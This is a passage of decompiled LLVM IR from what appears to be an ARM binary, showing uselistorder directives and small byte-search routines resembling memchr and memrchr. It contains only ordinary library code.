  uselistorder i32 %v10_15180, { 1, 0 }
  uselistorder i32 %v9_15178, { 1, 0, 2 }
  uselistorder i32 %v6_15174, { 1, 0 }
  uselistorder i32 %v2_1516c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1516c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1517c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15160, { 0, 2, 1 }
  uselistorder i32 %v13_1515c, { 1, 0 }
  uselistorder i32 %v4_15158, { 0, 2, 1, 3 }
  uselistorder i32 %v0_15158, { 2, 0, 1 }
  uselistorder i32 %v6_15160, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15150, { 0, 2, 1 }
  uselistorder i32 %v16_1514c, { 1, 0 }
  uselistorder i32 %v4_15148, { 1, 0 }
  uselistorder i32 %v0_15158.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15150, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1513c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15138, { 1, 0 }
  uselistorder i32 %v1_15134, { 1, 0 }
  uselistorder i32 %v10_15130, { 1, 0 }
  uselistorder i32 %v0_15130, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15134, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15128, { 0, 2, 1 }
  uselistorder i32 %v2_1511c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1511c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_1513448, { 1, 2, 0 }
  uselistorder i32 %v1_15114, { 2, 1, 0 }
  uselistorder i32 %v1_1510c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_15104, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_15100, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_150fc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_150fc, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_150e8, { 0, 2, 1 }
  uselistorder i32 %v3_150dc, { 1, 0 }
  uselistorder i32 %v2_150d4, { 0, 2, 1, 3 }
  uselistorder i32 %v12_150c4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_150a4, { 1, 0, 2 }
  uselistorder i32 %v5_150a4, { 1, 0, 2 }
  uselistorder i32 %v2_150a4, { 1, 0, 2 }
  uselistorder i32 %v3_150a0, { 1, 0 }
  uselistorder i32 %v0_150a4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_150c4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_1507c, { 0, 2, 1 }
  uselistorder i32 %v3_15070, { 1, 0 }
  uselistorder i32 %v2_15068, { 0, 2, 1, 3 }
  uselistorder i32 %v12_15058, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15038, { 1, 0, 2 }
  uselistorder i32 %v5_15038, { 1, 0, 2 }
  uselistorder i32 %v2_15038, { 1, 0, 2 }
  uselistorder i32 %v3_15034, { 1, 0 }
  uselistorder i32 %v0_15038, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15058, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_15010, { 0, 2, 1 }
  uselistorder i32 %v3_15004, { 1, 0 }
  uselistorder i32 %v2_14ffc, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14fec, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14fcc, { 1, 0, 2 }
  uselistorder i32 %v5_14fcc, { 1, 0, 2 }
  uselistorder i32 %v2_14fcc, { 1, 0, 2 }
  uselistorder i32 %v3_14fc8, { 1, 0 }
  uselistorder i32 %v0_14fcc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14fec, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_15094, { 2, 0, 1 }
  uselistorder i32 %v0_15098, { 3, 0, 2, 1 }
  uselistorder i32 %v0_14fec74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14f9c, { 1, 0 }
  uselistorder i32 %v0_14f9c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_14f94, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14f94, { 1, 0, 2 }
  uselistorder i32 %v0_14f94, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14fec75, { 2, 1, 0 }
  uselistorder i32 %v1_14f74, { 1, 0, 2 }
  uselistorder i32 %v1_14f4c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_14f4c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_14f38, { 1, 0, 2 }
  uselistorder i32 %v6_14f34, { 1, 0 }
  uselistorder i32 %v2_14f2c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_14f2c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_14f3c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_14f24, { 0, 2, 1 }
  uselistorder i1 %v0_14f24, { 1, 0 }
  uselistorder i1 %v1_14f24, { 1, 0 }
  uselistorder i32 %v3_14f20, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14f18, { 0, 2, 1, 3 }
  uselistorder i32 %v4_14f04, { 1, 0 }
  uselistorder i32 %v12_14ef8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14eec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14ef0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_14ee0, { 0, 2, 1 }
  uselistorder i32 %v2_14ed8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14ed8, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_14ed0, { 1, 0 }
  uselistorder i32 %v1_14ec8, { 2, 1, 0 }
  uselistorder i32 %v2_14ec0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_14ec0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14eb0, { 1, 0 }
  uselistorder i32 %v1_14eb0, { 1, 5, 6, 3, 4, 0, 7, 9, 2, 8, 10 }
  uselistorder i32 %v0_14eb0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 64, 65, 66, 67, 68, 69, 35, 60, 36, 37, 38, 39, 40, 61, 41, 42, 43, 44, 45, 62, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 63 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 34, 32, 35, 33, 36, 19, 18, 26, 20, 21, 24, 22, 27, 23, 25, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 30, 32, 31, 33, 34, 35, 36 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 0, 41, 1, 24, 2, 25, 42, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 0, 47, 2, 27, 1, 28, 48, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 11, { 7, 8, 9, 10, 3, 4, 11, 12, 13, 14, 15, 0, 16, 17, 18, 5, 19, 20, 6, 2, 1, 21 }
  uselistorder i32 48, { 0, 6, 7, 8, 1, 3, 9, 10, 12, 11, 4, 5, 2 }
  uselistorder i32 36, { 1, 0, 4, 5, 6, 2, 3 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 7, { 7, 8, 9, 0, 14, 10, 1, 2, 3, 11, 4, 5, 12, 6, 13 }
  uselistorder label %dec_label_pc_15318, { 2, 0, 1 }
  uselistorder label %dec_label_pc_152ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15240, { 2, 0, 1 }
  uselistorder label %dec_label_pc_151e0, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_1516c, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_15130, { 1, 0 }
  uselistorder label %dec_label_pc_1511c, { 1, 0 }
  uselistorder label %dec_label_pc_150dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15070, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15004, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14fa4, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb131, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_14f18, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14ed8, { 1, 0 }
}

define i32 @function_15338(i32 %arg1) local_unnamed_addr {
dec_label_pc_15338:
  ret i32 %arg1
}

define i32 @function_15340(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15340:
  %v3_15340 = load i32, i32* @r4, align 4
  %v6_15340 = load i32, i32* @r5, align 4
  %v9_15340 = load i32, i32* @r6, align 4
  %v1_15344 = urem i32 %arg1, 256
  %v0_1536018 = load i32, i32* @r2, align 4
  %v2_1536020 = icmp eq i32 %v0_1536018, 0
  br i1 %v2_1536020, label %dec_label_pc_15370, label %dec_label_pc_15368

dec_label_pc_1534c:                               ; preds = %dec_label_pc_15368
  %v3_1534c = load i8, i8* %.021, align 1
  %v4_1534c = zext i8 %v3_1534c to i32
  %v9_15350 = icmp eq i32 %v4_1534c, %v1_15344
  %v1_15354 = add i32 %v0_15354, -1
  br i1 %v9_15350, label %bb, label %dec_label_pc_15360

bb:                                               ; preds = %dec_label_pc_1534c
  ret i32 %v1_15368

dec_label_pc_15360:                               ; preds = %dec_label_pc_1534c
  %v2_1535c = add i32 %v1_15368, 1
  %v3_1535c = inttoptr i32 %v2_1535c to i8*
  %v2_15360 = icmp eq i32 %v1_15354, 0
  br i1 %v2_15360, label %dec_label_pc_15370, label %dec_label_pc_15368

dec_label_pc_15368:                               ; preds = %dec_label_pc_15340, %dec_label_pc_15360
  %v0_15354 = phi i32 [ %v1_15354, %dec_label_pc_15360 ], [ %v0_1536018, %dec_label_pc_15340 ]
  %.021 = phi i8* [ %v3_1535c, %dec_label_pc_15360 ], [ undef, %dec_label_pc_15340 ]
  %v1_15368 = ptrtoint i8* %.021 to i32
  %v2_15368 = urem i32 %v1_15368, 4
  %v3_15368 = icmp eq i32 %v2_15368, 0
  br i1 %v3_15368, label %dec_label_pc_15370, label %dec_label_pc_1534c

dec_label_pc_15370:                               ; preds = %dec_label_pc_15360, %dec_label_pc_15368, %dec_label_pc_15340
  %v0_153fc37 = phi i32 [ 0, %dec_label_pc_15340 ], [ 0, %dec_label_pc_15360 ], [ %v0_15354, %dec_label_pc_15368 ]
  %.0.lcssa = phi i8* [ undef, %dec_label_pc_15340 ], [ %v3_1535c, %dec_label_pc_15360 ], [ %.021, %dec_label_pc_15368 ]
  %v4_15370 = mul nuw nsw i32 %v1_15344, 256
  %v5_15370 = or i32 %v4_15370, %v1_15344
  %v1_15374 = ptrtoint i8* %.0.lcssa to i32
  %v4_15378 = mul i32 %v5_15370, 65536
  %v5_15378 = or i32 %v4_15378, %v5_15370
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_153fc37, 3
  br i1 %tmp, label %dec_label_pc_15380, label %dec_label_pc_15424.preheader

dec_label_pc_15380:                               ; preds = %dec_label_pc_15370, %dec_label_pc_153fc.backedge
  %v0_1539c82 = phi i32 [ %v1_1539c, %dec_label_pc_153fc.backedge ], [ %v0_153fc37, %dec_label_pc_15370 ]
  %v0_1538081 = phi i32 [ %v4_15380, %dec_label_pc_153fc.backedge ], [ %v1_15374, %dec_label_pc_15370 ]
  %v1_15380 = inttoptr i32 %v0_1538081 to i32*
  %v2_15380 = load i32, i32* %v1_15380, align 4
  %v4_15380 = add i32 %v0_1538081, 4
  %v2_15384 = xor i32 %v2_15380, %v5_15378
  %v2_15388 = add i32 %v2_15384, 2130640639
  %v1_1538c = sub i32 -1, %v2_15384
  %v2_15390 = xor i32 %v2_15388, %v1_1538c
  %v2_15394 = and i32 %v2_15390, -2130640640
  %v2_15398 = icmp eq i32 %v2_15394, 0
  %v1_1539c = add i32 %v0_1539c82, -4
  br i1 %v2_15398, label %dec_label_pc_153fc.backedge, label %dec_label_pc_153a4

dec_label_pc_153fc.backedge:                      ; preds = %dec_label_pc_15380, %dec_label_pc_153e8
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_1539c, 3
  br i1 %tmp107, label %dec_label_pc_15380, label %dec_label_pc_15424.preheader

dec_label_pc_153a4:                               ; preds = %dec_label_pc_15380
  %v2_153a4 = inttoptr i32 %v0_1538081 to i8*
  %v3_153a4 = load i8, i8* %v2_153a4, align 1
  %v4_153a4 = zext i8 %v3_153a4 to i32
  %v9_153ac = icmp eq i32 %v4_153a4, %v1_15344
  %v1_153b0 = add i32 %v0_1538081, 3
  %v1_153b4 = add i32 %v0_1538081, 1
  store i32 %v1_153b4, i32* @lr, align 4
  %v1_153b8 = add i32 %v0_1538081, 2
  br i1 %v9_153ac, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_153a4
  store i32 %v3_15340, i32* @r4, align 4
  store i32 %v6_15340, i32* @r5, align 4
  store i32 %v9_15340, i32* @r6, align 4
  ret i32 %v0_1538081

bb51:                                             ; preds = %dec_label_pc_153a4
  %v2_153c0 = inttoptr i32 %v1_153b4 to i8*
  %v3_153c0 = load i8, i8* %v2_153c0, align 1
  %v4_153c0 = zext i8 %v3_153c0 to i32
  %v9_153c4 = icmp eq i32 %v4_153c0, %v1_15344
  br i1 %v9_153c4, label %dec_label_pc_153cc, label %dec_label_pc_153d4

dec_label_pc_153cc:                               ; preds = %bb51
  store i32 %v3_15340, i32* @r4, align 4
  store i32 %v6_15340, i32* @r5, align 4
  store i32 %v9_15340, i32* @r6, align 4
  ret i32 %v1_153b4

dec_label_pc_153d4:                               ; preds = %bb51
  %v2_153d4 = inttoptr i32 %v1_153b8 to i8*
  %v3_153d4 = load i8, i8* %v2_153d4, align 1
  %v4_153d4 = zext i8 %v3_153d4 to i32
  %v9_153d8 = icmp eq i32 %v4_153d4, %v1_15344
  br i1 %v9_153d8, label %dec_label_pc_153e0, label %dec_label_pc_153e8

dec_label_pc_153e0:                               ; preds = %dec_label_pc_153d4
  store i32 %v3_15340, i32* @r4, align 4
  store i32 %v6_15340, i32* @r5, align 4
  store i32 %v9_15340, i32* @r6, align 4
  ret i32 %v1_153b8

dec_label_pc_153e8:                               ; preds = %dec_label_pc_153d4
  %v2_153e8 = inttoptr i32 %v1_153b0 to i8*
  %v3_153e8 = load i8, i8* %v2_153e8, align 1
  %v4_153e8 = zext i8 %v3_153e8 to i32
  %v9_153ec = icmp eq i32 %v4_153e8, %v1_15344
  br i1 %v9_153ec, label %dec_label_pc_153f4, label %dec_label_pc_153fc.backedge

dec_label_pc_153f4:                               ; preds = %dec_label_pc_153e8
  store i32 %v3_15340, i32* @r4, align 4
  store i32 %v6_15340, i32* @r5, align 4
  store i32 %v9_15340, i32* @r6, align 4
  ret i32 %v1_153b0

dec_label_pc_15424.preheader:                     ; preds = %dec_label_pc_153fc.backedge, %dec_label_pc_15370
  %v0_15380.lcssa = phi i32 [ %v1_15374, %dec_label_pc_15370 ], [ %v4_15380, %dec_label_pc_153fc.backedge ]
  %v0_1539c.lcssa = phi i32 [ %v0_153fc37, %dec_label_pc_15370 ], [ %v1_1539c, %dec_label_pc_153fc.backedge ]
  %v2_1542411 = icmp eq i32 %v0_1539c.lcssa, 0
  br i1 %v2_1542411, label %dec_label_pc_1542c, label %dec_label_pc_15414

dec_label_pc_15414:                               ; preds = %dec_label_pc_15424, %dec_label_pc_15424.preheader
  %v0_15424.in = phi i32 [ %v0_15424, %dec_label_pc_15424 ], [ %v0_1539c.lcssa, %dec_label_pc_15424.preheader ]
  %v15_1541c = phi i32 [ %v1_15420, %dec_label_pc_15424 ], [ %v0_15380.lcssa, %dec_label_pc_15424.preheader ]
  %v0_15424 = add i32 %v0_15424.in, -1
  %v1_15414 = inttoptr i32 %v15_1541c to i8*
  %v2_15414 = load i8, i8* %v1_15414, align 1
  %v3_15414 = zext i8 %v2_15414 to i32
  %v9_15418 = icmp eq i32 %v3_15414, %v1_15344
  br i1 %v9_15418, label %bb52, label %dec_label_pc_15424

bb52:                                             ; preds = %dec_label_pc_15414
  store i32 %v3_15340, i32* @r4, align 4
  store i32 %v6_15340, i32* @r5, align 4
  store i32 %v9_15340, i32* @r6, align 4
  ret i32 %v15_1541c

dec_label_pc_15424:                               ; preds = %dec_label_pc_15414
  %v1_15420 = add i32 %v15_1541c, 1
  %v2_15424 = icmp eq i32 %v0_15424, 0
  br i1 %v2_15424, label %dec_label_pc_1542c, label %dec_label_pc_15414

dec_label_pc_1542c:                               ; preds = %dec_label_pc_15424, %dec_label_pc_15424.preheader
  store i32 %v3_15340, i32* @r4, align 4
  store i32 %v6_15340, i32* @r5, align 4
  store i32 %v9_15340, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1541c, { 1, 0, 2 }
  uselistorder i32 %v1_1539c, { 1, 0, 2 }
  uselistorder i32 %v0_1538081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_15370, { 1, 0 }
  uselistorder i32 %v0_153fc37, { 1, 2, 0 }
  uselistorder i32 %v1_15344, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_15340, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_153fc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15380, { 1, 0 }
  uselistorder label %dec_label_pc_15370, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15368, { 1, 0 }
}

define i32 @function_1543c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1543c:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_15448 = call i32 @function_11d60()
  %v0_1544c = load i32, i32* @r5, align 4
  %v1_1544c = load i32, i32* @r4, align 4
  %v2_1544c = add i32 %v1_1544c, %v0_1544c
  ret i32 %v2_1544c

; uselistorder directives
  uselistorder i32 ()* @function_11d60, { 2, 6, 5, 1, 0, 9, 8, 7, 10, 4, 3 }
}

define i32 @function_15454(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15454:
  %v3_15454 = load i32, i32* @r4, align 4
  %v1_15458 = urem i32 %arg2, 256
  %v2_1545c = add i32 %arg3, %arg1
  %v2_154742 = icmp eq i32 %arg3, 0
  br i1 %v2_154742, label %dec_label_pc_15484, label %dec_label_pc_1547c

dec_label_pc_15464:                               ; preds = %dec_label_pc_1547c
  %v1_15464 = add i32 %v0_15464, -1
  %v2_15464 = inttoptr i32 %v1_15464 to i8*
  %v3_15464 = load i8, i8* %v2_15464, align 1
  %v4_15464 = zext i8 %v3_15464 to i32
  %v9_15468 = icmp eq i32 %v4_15464, %v1_15458
  br i1 %v9_15468, label %bb, label %dec_label_pc_15474

bb:                                               ; preds = %dec_label_pc_15464
  ret i32 %v1_15464

dec_label_pc_15474:                               ; preds = %dec_label_pc_15464
  %v1_15470 = add i32 %v0_15470, -1
  %v2_15474 = icmp eq i32 %v1_15470, 0
  br i1 %v2_15474, label %dec_label_pc_15484, label %dec_label_pc_1547c

dec_label_pc_1547c:                               ; preds = %dec_label_pc_15454, %dec_label_pc_15474
  %v0_15470 = phi i32 [ %v1_15470, %dec_label_pc_15474 ], [ %arg3, %dec_label_pc_15454 ]
  %v0_15464 = phi i32 [ %v1_15464, %dec_label_pc_15474 ], [ %v2_1545c, %dec_label_pc_15454 ]
  %v1_1547c = urem i32 %v0_15464, 4
  %v2_1547c = icmp eq i32 %v1_1547c, 0
  br i1 %v2_1547c, label %dec_label_pc_15484, label %dec_label_pc_15464

dec_label_pc_15484:                               ; preds = %dec_label_pc_15474, %dec_label_pc_1547c, %dec_label_pc_15454
  %v0_1551c11 = phi i32 [ %v2_1545c, %dec_label_pc_15454 ], [ %v1_15464, %dec_label_pc_15474 ], [ %v0_15464, %dec_label_pc_1547c ]
  %v0_155087 = phi i32 [ 0, %dec_label_pc_15454 ], [ 0, %dec_label_pc_15474 ], [ %v0_15470, %dec_label_pc_1547c ]
  %v4_15484 = mul nuw nsw i32 %v1_15458, 256
  %v5_15484 = or i32 %v4_15484, %v1_15458
  %v4_15488 = mul i32 %v5_15484, 65536
  %v5_15488 = or i32 %v4_15488, %v5_15484
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_155087, 3
  br i1 %tmp, label %dec_label_pc_15490, label %dec_label_pc_15518

dec_label_pc_15490:                               ; preds = %dec_label_pc_15484, %.backedge.backedge
  %v0_154ac51 = phi i32 [ %v1_154ac, %.backedge.backedge ], [ %v0_155087, %dec_label_pc_15484 ]
  %v0_1549050 = phi i32 [ %v1_15490, %.backedge.backedge ], [ %v0_1551c11, %dec_label_pc_15484 ]
  %v1_15490 = add i32 %v0_1549050, -4
  %v2_15490 = inttoptr i32 %v1_15490 to i32*
  %v3_15490 = load i32, i32* %v2_15490, align 4
  %v2_15494 = xor i32 %v3_15490, %v5_15488
  %v2_15498 = add i32 %v2_15494, 2130640639
  %v1_1549c = sub i32 -1, %v2_15494
  %v2_154a0 = xor i32 %v2_15498, %v1_1549c
  %v2_154a4 = and i32 %v2_154a0, -2130640640
  %v2_154a8 = icmp eq i32 %v2_154a4, 0
  %v1_154ac = add i32 %v0_154ac51, -4
  br i1 %v2_154a8, label %.backedge.backedge, label %dec_label_pc_154b4

dec_label_pc_154b4:                               ; preds = %dec_label_pc_15490
  %v1_154b4 = add i32 %v0_1549050, -1
  %v2_154b4 = inttoptr i32 %v1_154b4 to i8*
  %v3_154b4 = load i8, i8* %v2_154b4, align 1
  %v4_154b4 = zext i8 %v3_154b4 to i32
  %v9_154b8 = icmp eq i32 %v4_154b4, %v1_15458
  %v1_154bc = add i32 %v0_1549050, -2
  %v1_154c4 = add i32 %v0_1549050, -3
  store i32 %v1_154c4, i32* @lr, align 4
  br i1 %v9_154b8, label %dec_label_pc_154cc, label %dec_label_pc_154d4

dec_label_pc_154cc:                               ; preds = %dec_label_pc_154b4
  store i32 %v3_15454, i32* @r4, align 4
  ret i32 %v1_154b4

dec_label_pc_154d4:                               ; preds = %dec_label_pc_154b4
  %v2_154d4 = inttoptr i32 %v1_154bc to i8*
  %v3_154d4 = load i8, i8* %v2_154d4, align 1
  %v4_154d4 = zext i8 %v3_154d4 to i32
  %v9_154d8 = icmp eq i32 %v4_154d4, %v1_15458
  br i1 %v9_154d8, label %dec_label_pc_154e0, label %dec_label_pc_154e8

dec_label_pc_154e0:                               ; preds = %dec_label_pc_154d4
  store i32 %v3_15454, i32* @r4, align 4
  ret i32 %v1_154bc

dec_label_pc_154e8:                               ; preds = %dec_label_pc_154d4
  %v2_154e8 = inttoptr i32 %v1_154c4 to i8*
  %v3_154e8 = load i8, i8* %v2_154e8, align 1
  %v4_154e8 = zext i8 %v3_154e8 to i32
  %v9_154ec = icmp eq i32 %v4_154e8, %v1_15458
  br i1 %v9_154ec, label %dec_label_pc_154f4, label %dec_label_pc_154fc

dec_label_pc_154f4:                               ; preds = %dec_label_pc_154e8
  store i32 %v3_15454, i32* @r4, align 4
  ret i32 %v1_154c4

dec_label_pc_154fc:                               ; preds = %dec_label_pc_154e8
  %v1_154fc = inttoptr i32 %v1_15490 to i8*
  %v2_154fc = load i8, i8* %v1_154fc, align 1
  %v3_154fc = zext i8 %v2_154fc to i32
  %v9_15500 = icmp eq i32 %v3_154fc, %v1_15458
  br i1 %v9_15500, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_154fc, %dec_label_pc_15490
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_154ac, 3
  br i1 %tmp70, label %dec_label_pc_15490, label %dec_label_pc_15518

bb19:                                             ; preds = %dec_label_pc_154fc
  store i32 %v3_15454, i32* @r4, align 4
  ret i32 %v1_15490

dec_label_pc_1551c:                               ; preds = %dec_label_pc_15518
  %v1_15528 = add i32 %v0_15528, -1
  %v1_1551c = add i32 %v0_1551c, -1
  %v2_1551c = inttoptr i32 %v1_1551c to i8*
  %v3_1551c = load i8, i8* %v2_1551c, align 1
  %v4_1551c = zext i8 %v3_1551c to i32
  %v9_15520 = icmp eq i32 %v4_1551c, %v1_15458
  br i1 %v9_15520, label %bb20, label %dec_label_pc_15518

bb20:                                             ; preds = %dec_label_pc_1551c
  store i32 %v3_15454, i32* @r4, align 4
  ret i32 %v1_1551c

dec_label_pc_15518:                               ; preds = %dec_label_pc_15484, %.backedge.backedge, %dec_label_pc_1551c
  %v0_1551c = phi i32 [ %v1_1551c, %dec_label_pc_1551c ], [ %v0_1551c11, %dec_label_pc_15484 ], [ %v1_15490, %.backedge.backedge ]
  %v0_15528 = phi i32 [ %v1_15528, %dec_label_pc_1551c ], [ %v0_155087, %dec_label_pc_15484 ], [ %v1_154ac, %.backedge.backedge ]
  %v2_15528 = icmp eq i32 %v0_15528, 0
  br i1 %v2_15528, label %dec_label_pc_15530, label %dec_label_pc_1551c

dec_label_pc_15530:                               ; preds = %dec_label_pc_15518
  store i32 %v3_15454, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_15528, { 1, 0 }
  uselistorder i32 %v1_154ac, { 1, 0, 2 }
  uselistorder i32 %v1_15490, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1549050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15484, { 1, 0 }
  uselistorder i32 %v0_155087, { 1, 2, 0 }
  uselistorder i32 %v0_15464, { 1, 0, 2 }
  uselistorder i32 %v1_15464, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1545c, { 1, 0 }
  uselistorder i32 %v1_15458, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_15454, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15518, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15490, { 1, 0 }
  uselistorder label %dec_label_pc_15484, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1547c, { 1, 0 }
}

define i32 @function_15540() local_unnamed_addr {
dec_label_pc_15540:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15540 = load i32, i32* @r4, align 4
  store i32 %v3_15540, i32* %stack_var_-16, align 4
  %v6_15540 = load i32, i32* @r5, align 4
  %v0_15544 = load i32, i32* @r0, align 4
  store i32 %v0_15544, i32* %r4.global-to-local, align 4
  %v2_15544 = icmp eq i32 %v0_15544, 0
  %v1_15548 = load i32, i32* @r2, align 4
  br i1 %v2_15544, label %bb, label %dec_label_pc_15540._crit_edge

bb:                                               ; preds = %dec_label_pc_15540
  %v2_15548 = inttoptr i32 %v1_15548 to i32*
  %v3_15548 = load i32, i32* %v2_15548, align 4
  store i32 %v3_15548, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15540._crit_edge

dec_label_pc_15540._crit_edge:                    ; preds = %dec_label_pc_15540, %bb
  %v0_1554c = phi i32 [ %v3_15548, %bb ], [ %v0_15544, %dec_label_pc_15540 ]
